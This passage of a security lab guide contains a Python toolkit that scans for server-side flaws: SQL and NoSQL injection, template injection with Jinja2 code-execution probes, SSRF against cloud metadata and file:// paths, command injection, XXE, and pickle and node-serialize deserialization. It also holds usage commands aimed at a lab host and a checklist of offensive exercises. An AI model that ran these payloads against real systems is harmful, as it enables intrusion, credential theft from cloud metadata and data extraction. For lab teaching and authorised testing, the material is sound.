        'mysql': [r'You have an error in your SQL syntax', r'mysql_fetch',
                  r'MySQLSyntaxErrorException', r'SQLSTATE\[42000\]'],
        'mssql': [r'Unclosed quotation mark', r'Microsoft OLE DB',
                  r'ODBC SQL Server Driver', r'SqlException'],
        'sqlite': [r'SQLITE_ERROR', r'SQLite3::query', r'near ".*": syntax error'],
        'oracle': [r'ORA-\d{5}', r'Oracle error', r'quoted string not properly terminated'],
    }

    UNION_PROBES = [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL--",
        "' UNION ALL SELECT NULL,NULL,NULL--",
    ]

    BOOLEAN_PROBES = [
        ("' AND '1'='1", "' AND '1'='2"),
        ("' OR '1'='1", "' OR '1'='2"),
        ("1 AND 1=1", "1 AND 1=2"),
    ]

    TIME_PROBES = {
        'postgresql': "' AND (SELECT pg_sleep(3))--",
        'mysql': "' AND SLEEP(3)--",
        'mssql': "'; WAITFOR DELAY '0:0:3'--",
        'sqlite': "' AND 1=CASE WHEN 1=1 THEN (SELECT COUNT(*) FROM sqlite_master AS a, sqlite_master AS b) ELSE 0 END--",
    }

    def __init__(self, client: HTTPClient):
        self.client = client
        self.findings = []

    def scan_endpoint(self, url: str, param: str, method: str = 'GET') -> list:
        """Run all SQLi detection techniques against an endpoint."""
        self.findings = []

        # Error-based detection
        self._test_error_based(url, param, method)

        # Boolean-based blind
        self._test_boolean_blind(url, param, method)

        # Time-based blind
        self._test_time_blind(url, param, method)

        # UNION-based
        self._test_union(url, param, method)

        return self.findings

    def _test_error_based(self, url, param, method):
        payloads = ["'", "''", "\"", "')", "';", "\\"]
        for payload in payloads:
            resp = self._inject(url, param, payload, method)
            if resp is None:
                continue
            body = resp.text
            for db_type, patterns in self.ERROR_SIGNATURES.items():
                for pattern in patterns:
                    if re.search(pattern, body, re.IGNORECASE):
                        self.findings.append(Finding(
                            module='SQLiScanner',
                            severity='HIGH',
                            title=f'Error-based SQL Injection ({db_type})',
                            description=f'Database error message exposed when injecting {repr(payload)}',
                            endpoint=url,
                            payload=payload,
                            evidence=body[:500],
                            cwe='CWE-89',
                            cvss=8.6,
                            remediation='Use parameterized queries (prepared statements)',
                            owasp_api='API2:2023'
                        ))
                        return

    def _test_boolean_blind(self, url, param, method):
        for true_payload, false_payload in self.BOOLEAN_PROBES:
            resp_true = self._inject(url, param, true_payload, method)
            resp_false = self._inject(url, param, false_payload, method)
            if resp_true is None or resp_false is None:
                continue

            if resp_true.status_code == resp_false.status_code and \
               len(resp_true.text) != len(resp_false.text) and \
               abs(len(resp_true.text) - len(resp_false.text)) > 10:
                self.findings.append(Finding(
                    module='SQLiScanner',
                    severity='HIGH',
                    title='Boolean-based Blind SQL Injection',
                    description=f'Different response lengths for true ({len(resp_true.text)}) vs false ({len(resp_false.text)}) conditions',
                    endpoint=url,
                    payload=f'TRUE: {true_payload} | FALSE: {false_payload}',
                    evidence=f'True response: {len(resp_true.text)} bytes, False: {len(resp_false.text)} bytes',
                    cwe='CWE-89',
                    cvss=8.6,
                    remediation='Use parameterized queries',
                    owasp_api='API2:2023'
                ))
                return

    def _test_time_blind(self, url, param, method):
        # Baseline timing
        start = time.time()
        self._inject(url, param, 'baseline_test', method)
        baseline = time.time() - start

        for db_type, payload in self.TIME_PROBES.items():
            start = time.time()
            try:
                self._inject(url, param, payload, method)
            except requests.exceptions.Timeout:
                elapsed = time.time() - start
                if elapsed > 2.5:
                    self.findings.append(Finding(
                        module='SQLiScanner',
                        severity='HIGH',
                        title=f'Time-based Blind SQL Injection ({db_type})',
                        description=f'Response delayed {elapsed:.1f}s (baseline: {baseline:.1f}s)',
                        endpoint=url,
                        payload=payload,
                        cwe='CWE-89',
                        cvss=8.6,
                        remediation='Use parameterized queries',
                        owasp_api='API2:2023'
                    ))
                    return
                continue

            elapsed = time.time() - start
            if elapsed > baseline + 2.5:
                self.findings.append(Finding(
                    module='SQLiScanner',
                    severity='HIGH',
                    title=f'Time-based Blind SQL Injection ({db_type})',
                    description=f'Response delayed {elapsed:.1f}s (baseline: {baseline:.1f}s)',
                    endpoint=url,
                    payload=payload,
                    cwe='CWE-89',
                    cvss=8.6,
                    remediation='Use parameterized queries',
                    owasp_api='API2:2023'
                ))
                return

    def _test_union(self, url, param, method):
        for probe in self.UNION_PROBES:
            resp = self._inject(url, param, probe, method)
            if resp is None:
                continue
            if resp.status_code == 200 and 'null' in resp.text.lower():
                col_count = probe.count('NULL')
                self.findings.append(Finding(
                    module='SQLiScanner',
                    severity='CRITICAL',
                    title=f'UNION-based SQL Injection ({col_count} columns)',
                    description='UNION SELECT returned successfully, enabling direct data extraction',
                    endpoint=url,
                    payload=probe,
                    evidence=resp.text[:500],
                    cwe='CWE-89',
                    cvss=9.8,
                    remediation='Use parameterized queries',
                    owasp_api='API2:2023'
                ))
                return

    def _inject(self, url, param, payload, method):
        try:
            if method.upper() == 'GET':
                return self.client.get(url, params={param: payload})
            else:
                return self.client.post(url, data={param: payload})
        except Exception:
            return None


# ═══════════════════════════════════════════════════════════
# MODULE 2: NOSQL INJECTION SCANNER
# ═══════════════════════════════════════════════════════════

class NoSQLiScanner:
    """Detects MongoDB operator injection and $where injection."""

    def __init__(self, client: HTTPClient):
        self.client = client
        self.findings = []

    def scan_endpoint(self, url: str, method: str = 'POST') -> list:
        self.findings = []
        self._test_operator_injection(url)
        self._test_regex_extraction(url)
        return self.findings

    def _test_operator_injection(self, url):
        payloads = [
            {'username': 'admin', 'password': {'$ne': ''}},
            {'username': {'$ne': ''}, 'password': {'$ne': ''}},
            {'username': 'admin', 'password': {'$gt': ''}},
            {'username': {'$regex': '.*'}, 'password': {'$regex': '.*'}},
        ]
        for payload in payloads:
            try:
                resp = self.client.post(url, json=payload)
                if resp.status_code == 200 and 'success' in resp.text.lower():
                    self.findings.append(Finding(
                        module='NoSQLiScanner',
                        severity='CRITICAL',
                        title='NoSQL Operator Injection — Authentication Bypass',
                        description='MongoDB operator accepted in password field, bypassing authentication',
                        endpoint=url,
                        payload=json.dumps(payload),
                        evidence=resp.text[:500],
                        cwe='CWE-943',
                        cvss=9.8,
                        remediation='Enforce string type for all auth fields; use mongo-sanitize',
                        owasp_api='API2:2023'
                    ))
                    return
            except Exception:
                continue

    def _test_regex_extraction(self, url):
        try:
            payload = {'username': 'admin', 'password': {'$regex': '^.'}}
            resp = self.client.post(url, json=payload)
            if resp.status_code == 200 and 'success' in resp.text.lower():
                self.findings.append(Finding(
                    module='NoSQLiScanner',
                    severity='HIGH',
                    title='NoSQL $regex Injection — Data Extraction',
                    description='$regex operator allows character-by-character password extraction',
                    endpoint=url,
                    payload=json.dumps(payload),
                    cwe='CWE-943',
                    cvss=7.5,
                    remediation='Strip MongoDB operators from all user input',
                    owasp_api='API2:2023'
                ))
        except Exception:
            pass


# ═══════════════════════════════════════════════════════════
# MODULE 3: SSTI DETECTOR
# ═══════════════════════════════════════════════════════════

class SSTIDetector:
    """Detects server-side template injection across engines."""

    ENGINE_PROBES = {
        'jinja2': [
            ('{{7*7}}', '49'),
            ("{{7*'7'}}", '7777777'),
        ],
        'twig': [
            ('{{7*7}}', '49'),
            ("{{7*'7'}}", '49'),
        ],
        'freemarker': [
            ('${7*7}', '49'),
        ],
        'erb': [
            ('<%= 7*7 %>', '49'),
        ],
        'pug': [
            ('#{7*7}', '49'),
        ],
    }

    def __init__(self, client: HTTPClient):
        self.client = client
        self.findings = []

    def scan_endpoint(self, url: str, param: str = 'name') -> list:
        self.findings = []
        detected_engine = None

        for engine, probes in self.ENGINE_PROBES.items():
            for probe, expected in probes:
                try:
                    resp = self.client.get(url, params={param: probe})
                    if expected in resp.text:
                        detected_engine = engine
                        self.findings.append(Finding(
                            module='SSTIDetector',
                            severity='CRITICAL',
                            title=f'Server-Side Template Injection ({engine})',
                            description=f'Template expression {probe} evaluated to {expected}',
                            endpoint=url,
                            payload=probe,
                            evidence=resp.text[:500],
                            cwe='CWE-1336',
                            cvss=9.8,
                            remediation='Never embed user input in template source; pass as variables',
                            owasp_api='API8:2023'
                        ))
                        break
                except Exception:
                    continue

        # If Jinja2 detected, test for RCE
        if detected_engine == 'jinja2':
            self._test_jinja2_rce(url, param)

        return self.findings

    def _test_jinja2_rce(self, url, param):
        rce_probes = [
            "{{config.__class__.__init__.__globals__['os'].popen('echo SSTI_RCE_CONFIRMED').read()}}",
            "{{lipsum.__globals__.os.popen('echo SSTI_RCE_CONFIRMED').read()}}",
        ]
        for probe in rce_probes:
            try:
                resp = self.client.get(url, params={param: probe})
                if 'SSTI_RCE_CONFIRMED' in resp.text:
                    self.findings.append(Finding(
                        module='SSTIDetector',
                        severity='CRITICAL',
                        title='SSTI → Remote Code Execution (Jinja2)',
                        description='Arbitrary OS command execution achieved via template injection',
                        endpoint=url,
                        payload=probe,
                        evidence=resp.text[:500],
                        cwe='CWE-94',
                        cvss=10.0,
                        remediation='Use SandboxedEnvironment; never embed user input in template source',
                    ))
                    return
            except Exception:
                continue


# ═══════════════════════════════════════════════════════════
# MODULE 4: SSRF TESTER
# ═══════════════════════════════════════════════════════════

class SSRFTester:
    """Tests for SSRF to internal networks and cloud metadata."""

    METADATA_TARGETS = {
        'AWS IMDSv1': 'http://169.254.169.254/latest/meta-data/',
        'AWS User Data': 'http://169.254.169.254/latest/user-data',
        'GCP Metadata': 'http://metadata.google.internal/computeMetadata/v1/',
        'Azure IMDS': 'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
    }

    INTERNAL_PROBES = [
        'http://127.0.0.1:80/',
        'http://127.0.0.1:8080/',
        'http://127.0.0.1:3000/',
        'http://127.0.0.1:6379/',
        'http://localhost:8888/',
        'http://10.0.0.1/',
        'http://192.168.1.1/',
    ]

    BYPASS_ENCODINGS = {
        'hex': 'http://0x7f000001/',
        'decimal': 'http://2130706433/',
        'octal': 'http://0177.0.0.1/',
        'ipv6': 'http://[::1]/',
        'short': 'http://127.1/',
    }

    PROTOCOL_PROBES = [
        'file:///etc/passwd',
        'file:///etc/hostname',
        'file:///proc/self/environ',
    ]

    def __init__(self, client: HTTPClient):
        self.client = client
        self.findings = []

    def scan_endpoint(self, url: str, param: str = 'url') -> list:
        self.findings = []
        self._test_metadata(url, param)
        self._test_internal(url, param)
        self._test_bypass(url, param)
        self._test_protocols(url, param)
        return self.findings

    def _test_metadata(self, url, param):
        for name, target in self.METADATA_TARGETS.items():
            try:
                resp = self.client.get(url, params={param: target})
                body = resp.text
                if resp.status_code == 200 and \
                   any(k in body for k in ['AccessKeyId', 'iam', 'instance', 'metadata', 'token']):
                    self.findings.append(Finding(
                        module='SSRFTester',
                        severity='CRITICAL',
                        title=f'SSRF to Cloud Metadata — {name}',
                        description=f'Server fetched cloud metadata endpoint, potentially exposing credentials',
                        endpoint=url,
                        payload=target,
                        evidence=body[:1000],
                        cwe='CWE-918',
                        cvss=9.8,
                        remediation='Block RFC1918/link-local addresses; enforce IMDSv2; validate URLs server-side',
                        owasp_api='API7:2023'
                    ))
            except Exception:
                continue

    def _test_internal(self, url, param):
        for target in self.INTERNAL_PROBES:
            try:
                resp = self.client.get(url, params={param: target}, timeout=5)
                body = resp.text
                if resp.status_code == 200 and len(body) > 10 and 'error' not in body.lower()[:100]:
                    self.findings.append(Finding(
                        module='SSRFTester',
                        severity='HIGH',
                        title=f'SSRF to Internal Service',
                        description=f'Server fetched internal endpoint {target}',
                        endpoint=url,
                        payload=target,
                        evidence=body[:500],
                        cwe='CWE-918',
                        cvss=7.5,
                        remediation='Implement URL validation with DNS resolution before request',
                    ))
            except Exception:
                continue

    def _test_bypass(self, url, param):
        for name, target in self.BYPASS_ENCODINGS.items():
            try:
                resp = self.client.get(url, params={param: target}, timeout=5)
                if resp.status_code == 200 and len(resp.text) > 10:
                    self.findings.append(Finding(
                        module='SSRFTester',
                        severity='MEDIUM',
                        title=f'SSRF Bypass via {name} IP Encoding',
                        description=f'IP encoding bypass ({name}) reached internal address',
                        endpoint=url,
                        payload=target,
                        cwe='CWE-918',
                        cvss=6.5,
                        remediation='Resolve DNS before request; check resolved IP against blocklist',
                    ))
            except Exception:
                continue

    def _test_protocols(self, url, param):
        for target in self.PROTOCOL_PROBES:
            try:
                resp = self.client.get(url, params={param: target}, timeout=5)
                if resp.status_code == 200 and ('root:' in resp.text or '/bin/' in resp.text or '=' in resp.text):
                    self.findings.append(Finding(
                        module='SSRFTester',
                        severity='CRITICAL',
                        title=f'SSRF via file:// Protocol — Local File Read',
                        description=f'file:// protocol allowed, enabling local file reading',
                        endpoint=url,
                        payload=target,
                        evidence=resp.text[:500],
                        cwe='CWE-918',
                        cvss=9.1,
                        remediation='Restrict to http/https schemes only',
                    ))
                    return
            except Exception:
                continue


# ═══════════════════════════════════════════════════════════
# MODULE 5: COMMAND INJECTION TESTER
# ═══════════════════════════════════════════════════════════

class CMDiTester:
    """Detects OS command injection via multiple techniques."""

    INJECTION_PAYLOADS = [
        (';id', 'uid='),
        ('|id', 'uid='),
        ('$(id)', 'uid='),
        ('`id`', 'uid='),
        ('\nid', 'uid='),
        ('&&id', 'uid='),
        ('||id', 'uid='),
    ]

    def __init__(self, client: HTTPClient):
        self.client = client
        self.findings = []

    def scan_endpoint(self, url: str, param: str = 'host') -> list:
        self.findings = []
        self._test_direct(url, param)
        self._test_time_based(url, param)
        return self.findings

    def _test_direct(self, url, param):
        for payload, indicator in self.INJECTION_PAYLOADS:
            try:
                resp = self.client.get(url, params={param: f'127.0.0.1{payload}'})
                if indicator in resp.text:
                    separator = payload[0] if payload[0] in ';|' else payload[:2]
                    self.findings.append(Finding(
                        module='CMDiTester',
                        severity='CRITICAL',
                        title=f'OS Command Injection via "{separator}" separator',
                        description=f'Shell metacharacter "{separator}" allows arbitrary command execution',
                        endpoint=url,
                        payload=f'127.0.0.1{payload}',
                        evidence=resp.text[:500],
                        cwe='CWE-78',
                        cvss=9.8,
                        remediation='Use execFile() or subprocess with list args; never shell=True',
                        owasp_api='API8:2023'
                    ))
                    return
            except Exception:
                continue

    def _test_time_based(self, url, param):
        delay = 5
        payloads = [
            f'127.0.0.1;sleep {delay}',
            f'127.0.0.1|sleep {delay}',
            f'127.0.0.1$(sleep {delay})',
        ]
        baseline_start = time.time()
        try:
            self.client.get(url, params={param: '127.0.0.1'})
        except Exception:
            return
        baseline = time.time() - baseline_start

        for payload in payloads:
            start = time.time()
            try:
                self.client.get(url, params={param: payload}, timeout=delay + 10)
            except requests.exceptions.Timeout:
                elapsed = time.time() - start
                if elapsed >= delay - 1:
                    self.findings.append(Finding(
                        module='CMDiTester',
                        severity='CRITICAL',
                        title='Blind Command Injection (time-based)',
                        description=f'sleep({delay}) caused {elapsed:.1f}s delay (baseline: {baseline:.1f}s)',
                        endpoint=url,
                        payload=payload,
                        cwe='CWE-78',
                        cvss=9.8,
                        remediation='Use execFile() with argument arrays; validate input with allowlist',
                    ))
                    return
                continue

            elapsed = time.time() - start
            if elapsed >= baseline + delay - 1:
                self.findings.append(Finding(
                    module='CMDiTester',
                    severity='CRITICAL',
                    title='Blind Command Injection (time-based)',
                    description=f'sleep({delay}) caused {elapsed:.1f}s delay (baseline: {baseline:.1f}s)',
                    endpoint=url,
                    payload=payload,
                    cwe='CWE-78',
                    cvss=9.8,
                    remediation='Use execFile() with argument arrays; validate input with allowlist',
                ))
                return


# ═══════════════════════════════════════════════════════════
# MODULE 6: XXE TESTER
# ═══════════════════════════════════════════════════════════

class XXETester:
    """Tests for XML External Entity injection."""

    def __init__(self, client: HTTPClient):
        self.client = client
        self.findings = []

    def scan_endpoint(self, url: str) -> list:
        self.findings = []
        self._test_file_read(url)
        self._test_ssrf(url)
        self._test_dos(url)
        return self.findings

    def _test_file_read(self, url):
        payload = '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<data>&xxe;</data>'''

        try:
            resp = self.client.post(url,
                data=payload.encode(),
                headers={'Content-Type': 'application/xml'})
            if resp.status_code == 200:
                body = resp.text
                if 'hostname' not in body.lower() or len(body) > 20:
                    self.findings.append(Finding(
                        module='XXETester',
                        severity='CRITICAL',
                        title='XXE — Local File Read',
                        description='XML external entity resolved file:// URI',
                        endpoint=url,
                        payload='<!ENTITY xxe SYSTEM "file:///etc/hostname">',
                        evidence=body[:500],
                        cwe='CWE-611',
                        cvss=9.1,
                        remediation='Disable DTD processing; use defusedxml (Python), disable external entities (Java)',
                    ))
        except Exception:
            pass

    def _test_ssrf(self, url):
        payload = '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<data>&xxe;</data>'''

        try:
            resp = self.client.post(url,
                data=payload.encode(),
                headers={'Content-Type': 'application/xml'})
            if resp.status_code == 200 and 'iam' in resp.text.lower():
                self.findings.append(Finding(
                    module='XXETester',
                    severity='CRITICAL',
                    title='XXE → SSRF to Cloud Metadata',
                    description='XXE entity resolved HTTP URI to internal metadata endpoint',
                    endpoint=url,
                    payload='<!ENTITY xxe SYSTEM "http://169.254.169.254/...">',
                    evidence=resp.text[:500],
                    cwe='CWE-611',
                    cvss=9.8,
                    remediation='Disable all external entity resolution in XML parser',
                ))
        except Exception:
            pass

    def _test_dos(self, url):
        payload = '''<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<data>&lol3;</data>'''

        try:
            start = time.time()
            resp = self.client.post(url,
                data=payload.encode(),
                headers={'Content-Type': 'application/xml'},
                timeout=15)
            elapsed = time.time() - start
            if elapsed > 5 or 'lol' in resp.text:
                self.findings.append(Finding(
                    module='XXETester',
                    severity='HIGH',
                    title='XXE — Entity Expansion DoS (Billion Laughs)',
                    description=f'Entity expansion caused {elapsed:.1f}s processing time',
                    endpoint=url,
                    payload='Nested entity expansion (3 levels)',
                    cwe='CWE-776',
                    cvss=7.5,
                    remediation='Set entity expansion limits; disable DTD processing entirely',
                ))
        except requests.exceptions.Timeout:
            self.findings.append(Finding(
                module='XXETester',
                severity='HIGH',
                title='XXE — Entity Expansion DoS (Billion Laughs)',
                description='Entity expansion caused request timeout (likely exponential growth)',
                endpoint=url,
                payload='Nested entity expansion',
                cwe='CWE-776',
                cvss=7.5,
                remediation='Set entity expansion limits; disable DTD processing entirely',
            ))
        except Exception:
            pass


# ═══════════════════════════════════════════════════════════
# MODULE 7: DESERIALIZATION TESTER
# ═══════════════════════════════════════════════════════════

class DeserTester:
    """Tests for insecure deserialization across languages."""

    def __init__(self, client: HTTPClient):
        self.client = client
        self.findings = []

    def scan_endpoint(self, url: str, lang: str = 'auto') -> list:
        self.findings = []
        if lang in ('auto', 'python'):
            self._test_pickle(url)
        if lang in ('auto', 'node'):
            self._test_node_serialize(url)
        return self.findings

    def _test_pickle(self, url):
        class SafeProbe:
            def __reduce__(self):
                return (eval, ("'PICKLE_DESERIALIZED'",))

        payload = base64.b64encode(pickle.dumps(SafeProbe())).decode()
        try:
            resp = self.client.post(url, data={'session_data': payload})
            if 'PICKLE_DESERIALIZED' in resp.text:
                self.findings.append(Finding(
                    module='DeserTester',
                    severity='CRITICAL',
                    title='Python Pickle Deserialization — RCE',
                    description='Server deserializes pickle from user input, enabling arbitrary code execution',
                    endpoint=url,
                    payload=f'pickle payload (base64): {payload[:80]}...',
                    evidence=resp.text[:500],
                    cwe='CWE-502',
                    cvss=9.8,
                    remediation='Never use pickle for untrusted data; use JSON with schema validation',
                ))
        except Exception:
            pass

    def _test_node_serialize(self, url):
        payload = {
            "test": "_$$ND_FUNC$$_function(){return 'NODE_DESER_CONFIRMED'}()"
        }
        try:
            resp = self.client.post(url, json=payload)
            if 'NODE_DESER_CONFIRMED' in resp.text:
                self.findings.append(Finding(
                    module='DeserTester',
                    severity='CRITICAL',
                    title='Node.js node-serialize Deserialization — RCE',
                    description='IIFE in serialized data executes during deserialization',
                    endpoint=url,
                    payload=json.dumps(payload),
                    evidence=resp.text[:500],
                    cwe='CWE-502',
                    cvss=9.8,
                    remediation='Use JSON.parse() instead of node-serialize; validate with JSON schema',
                ))
        except Exception:
            pass


# ═══════════════════════════════════════════════════════════
# MODULE 8: API AUDITOR
# ═══════════════════════════════════════════════════════════

class APIAuditor:
    """Tests for BOLA/IDOR, mass assignment, and rate limiting issues."""

    def __init__(self, client: HTTPClient):
        self.client = client
        self.findings = []

    def scan_bola(self, base_url: str, auth_token: str, user_id: int, other_ids: list) -> list:
        """Test for Broken Object Level Authorization (IDOR)."""
        self.findings = []
        headers = {'Authorization': f'Bearer {auth_token}'}

        for oid in other_ids:
            if oid == user_id:
                continue
            try:
                resp = self.client.get(
                    f'{base_url}/{oid}/profile',
                    headers=headers
                )
                if resp.status_code == 200:
                    data = resp.json()
                    sensitive_fields = [k for k in data.keys()
                                      if k in ('ssn', 'credit_card', 'password', 'api_key')]
                    if sensitive_fields:
                        self.findings.append(Finding(
                            module='APIAuditor',
                            severity='CRITICAL',
                            title=f'BOLA/IDOR — PII Exposure (user {oid})',
                            description=f'Accessed another user\'s profile with sensitive fields: {sensitive_fields}',
                            endpoint=f'{base_url}/{oid}/profile',
                            evidence=json.dumps(data)[:500],
                            cwe='CWE-639',
                            cvss=9.1,
                            remediation='Enforce object-level authorization; verify requesting user owns the resource',
                            owasp_api='API1:2023'
                        ))
            except Exception:
                continue
        return self.findings

    def scan_mass_assignment(self, url: str, auth_token: str, user_id: int) -> list:
        """Test for mass assignment / excessive data exposure."""
        headers = {
            'Authorization': f'Bearer {auth_token}',
            'Content-Type': 'application/json'
        }
        payloads = [
            {'role': 'admin'},
            {'is_admin': True},
            {'role': 'admin', 'is_admin': True},
        ]

        for payload in payloads:
            try:
                resp = self.client.put(
                    f'{url}/{user_id}',
                    headers=headers,
                    json=payload
                )
                if resp.status_code == 200:
                    data = resp.json()
                    if data.get('role') == 'admin' or data.get('is_admin') is True:
                        self.findings.append(Finding(
                            module='APIAuditor',
                            severity='CRITICAL',
                            title='Mass Assignment — Privilege Escalation',
                            description=f'Role/admin fields writable via API: {json.dumps(payload)}',
                            endpoint=f'{url}/{user_id}',
                            payload=json.dumps(payload),
                            evidence=json.dumps(data)[:500],
                            cwe='CWE-915',
                            cvss=8.1,
                            remediation='Use explicit field allowlists; never bind request body directly to model',
                            owasp_api='API3:2023'
                        ))
                        return self.findings
            except Exception:
                continue
        return self.findings

    def scan_rate_limiting(self, url: str, requests_count: int = 50) -> list:
        """Test if rate limiting is enforced."""
        statuses = []
        for i in range(requests_count):
            try:
                resp = self.client.post(url,
                    json={'username': 'admin', 'password': f'wrong_{i}'})
                statuses.append(resp.status_code)
            except Exception:
                break

        rate_limited = sum(1 for s in statuses if s == 429)
        if rate_limited == 0 and len(statuses) >= requests_count:
            self.findings.append(Finding(
                module='APIAuditor',
                severity='HIGH',
                title='Missing Rate Limiting on Authentication Endpoint',
                description=f'{requests_count} login attempts without rate limiting (no 429 responses)',
                endpoint=url,
                cwe='CWE-307',
                cvss=7.5,
                remediation='Implement rate limiting per IP and per account; use progressive delays',
                owasp_api='API4:2023'
            ))
        return self.findings


# ═══════════════════════════════════════════════════════════
# REPORT GENERATOR
# ═══════════════════════════════════════════════════════════

class ReportGenerator:
    """Generates structured security assessment reports."""

    @staticmethod
    def generate_json(result: ScanResult) -> str:
        result.generate_summary()
        output = {
            'target': result.target,
            'scan_time': result.scan_time,
            'modules_run': result.modules_run,
            'summary': result.summary,
            'findings': [asdict(f) for f in result.findings],
        }
        return json.dumps(output, indent=2, default=str)

    @staticmethod
    def generate_markdown(result: ScanResult) -> str:
        result.generate_summary()
        lines = [
            f"# Server-Side Security Assessment Report",
            f"",
            f"**Target:** {result.target}",
            f"**Scan Time:** {result.scan_time}",
            f"**Modules:** {', '.join(result.modules_run)}",
            f"",
            f"## Summary",
            f"",
            f"| Severity | Count |",
            f"|----------|-------|",
            f"| CRITICAL | {result.summary.get('critical', 0)} |",
            f"| HIGH | {result.summary.get('high', 0)} |",
            f"| MEDIUM | {result.summary.get('medium', 0)} |",
            f"| LOW | {result.summary.get('low', 0)} |",
            f"| INFO | {result.summary.get('info', 0)} |",
            f"| **TOTAL** | **{result.summary.get('total_findings', 0)}** |",
            f"",
            f"## Findings",
            f"",
        ]

        for i, f in enumerate(result.findings, 1):
            sev_emoji = {'CRITICAL': '[!]', 'HIGH': '[!]', 'MEDIUM': '[*]', 'LOW': '[-]', 'INFO': '[i]'}
            lines.extend([
                f"### {i}. {sev_emoji.get(f.severity, '')} {f.title}",
                f"",
                f"- **Severity:** {f.severity} (CVSS: {f.cvss})",
                f"- **Module:** {f.module}",
                f"- **Endpoint:** `{f.endpoint}`",
                f"- **CWE:** {f.cwe}",
                f"- **OWASP API:** {f.owasp_api}" if f.owasp_api else "",
                f"- **Payload:** `{f.payload[:200]}`" if f.payload else "",
                f"",
                f"**Description:** {f.description}",
                f"",
                f"**Evidence:** {f.evidence[:300]}" if f.evidence else "",
                f"",
                f"**Remediation:** {f.remediation}",
                f"",
                f"---",
                f"",
            ])

        return '\n'.join(lines)


# ═══════════════════════════════════════════════════════════
# MAIN ORCHESTRATOR
# ═══════════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(description='Server-Side Security Assessment Toolkit')
    parser.add_argument('--target', required=True, help='Base target URL')
    parser.add_argument('--modules', default='all',
                       help='Comma-separated modules: sqli,nosqli,ssti,ssrf,cmdi,xxe,deser,api')
    parser.add_argument('--output', default='report.json', help='Output file path')
    parser.add_argument('--format', choices=['json', 'markdown'], default='json')
    parser.add_argument('--timeout', type=int, default=10, help='HTTP request timeout')
    parser.add_argument('--auth-token', default='', help='JWT auth token for API testing')
    args = parser.parse_args()

    client = HTTPClient(timeout=args.timeout)
    result = ScanResult(
        target=args.target,
        scan_time=time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()),
    )

    modules = args.modules.split(',') if args.modules != 'all' else [
        'sqli', 'nosqli', 'ssti', 'ssrf', 'cmdi', 'xxe', 'deser', 'api'
    ]

    target = args.target.rstrip('/')

    for mod in modules:
        print(f"[*] Running module: {mod}")
        result.modules_run.append(mod)

        if mod == 'sqli':
            scanner = SQLiScanner(client)
            findings = scanner.scan_endpoint(f'{target}/api/search', 'q')
            result.findings.extend(findings)

        elif mod == 'nosqli':
            scanner = NoSQLiScanner(client)
            nosql_target = target.replace(':3000', ':3002')
            findings = scanner.scan_endpoint(f'{nosql_target}/api/login')
            result.findings.extend(findings)

        elif mod == 'ssti':
            scanner = SSTIDetector(client)
            flask_target = target.replace(':3000', ':5000')
            findings = scanner.scan_endpoint(f'{flask_target}/greet', 'name')
            result.findings.extend(findings)

        elif mod == 'ssrf':
            scanner = SSRFTester(client)
            findings = scanner.scan_endpoint(f'{target}/api/fetch', 'url')
            result.findings.extend(findings)

        elif mod == 'cmdi':
            scanner = CMDiTester(client)
            findings = scanner.scan_endpoint(f'{target}/api/ping', 'host')
            result.findings.extend(findings)

        elif mod == 'xxe':
            scanner = XXETester(client)
            findings = scanner.scan_endpoint(f'{target}/api/xml-import')
            result.findings.extend(findings)

        elif mod == 'deser':
            scanner = DeserTester(client)
            flask_target = target.replace(':3000', ':5000')
            findings = scanner.scan_endpoint(f'{flask_target}/api/session', 'python')
            result.findings.extend(findings)
            findings = scanner.scan_endpoint(f'{target}/api/deserialize', 'node')
            result.findings.extend(findings)

        elif mod == 'api':
            auditor = APIAuditor(client)
            if args.auth_token:
                findings = auditor.scan_bola(
                    f'{target}/api/v1/users',
                    args.auth_token, 2, [1, 3, 4, 5]
                )
                result.findings.extend(findings)
                findings = auditor.scan_mass_assignment(
                    f'{target}/api/v1/users',
                    args.auth_token, 2
                )
                result.findings.extend(findings)
            findings = auditor.scan_rate_limiting(f'{target}/api/login')
            result.findings.extend(findings)

        print(f"    Found {len([f for f in result.findings if f.module.lower().startswith(mod[:4])])} issues")

    # Generate report
    if args.format == 'json':
        report = ReportGenerator.generate_json(result)
    else:
        report = ReportGenerator.generate_markdown(result)

    with open(args.output, 'w') as f:
        f.write(report)

    result.generate_summary()
    print(f"\n{'='*60}")
    print(f"SCAN COMPLETE")
    print(f"{'='*60}")
    print(f"Target:   {result.target}")
    print(f"Findings: {result.summary['total_findings']}")
    print(f"  CRITICAL: {result.summary['critical']}")
    print(f"  HIGH:     {result.summary['high']}")
    print(f"  MEDIUM:   {result.summary['medium']}")
    print(f"  LOW:      {result.summary['low']}")
    print(f"Report:   {args.output}")


if __name__ == '__main__':
    main()
```

**Toolkit usage:**

```bash
# Run all modules against target
python3 server_attack_toolkit.py \
  --target http://10.8.1.10:3000 \
  --modules all \
  --output scan_results.json \
  --format json

# Run specific modules
python3 server_attack_toolkit.py \
  --target http://10.8.1.10:3000 \
  --modules sqli,ssrf,cmdi \
  --output targeted_scan.json

# Include API testing with auth
TOKEN=$(curl -s -X POST http://10.8.1.10:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"alice_hash"}' | jq -r .token)

python3 server_attack_toolkit.py \
  --target http://10.8.1.10:3000 \
  --modules api \
  --auth-token "$TOKEN" \
  --output api_audit.json

# Generate markdown report
python3 server_attack_toolkit.py \
  --target http://10.8.1.10:3000 \
  --modules all \
  --output report.md \
  --format markdown
```

---

## Lab Validation Checklist

### Part A — Offensive Exercises

- [ ] **Ex1 (SQLi):** Union extraction dumps secrets table; blind extraction recovers password hash; auth bypass returns admin JWT; second-order injection changes admin password; sqlmap confirms all variants
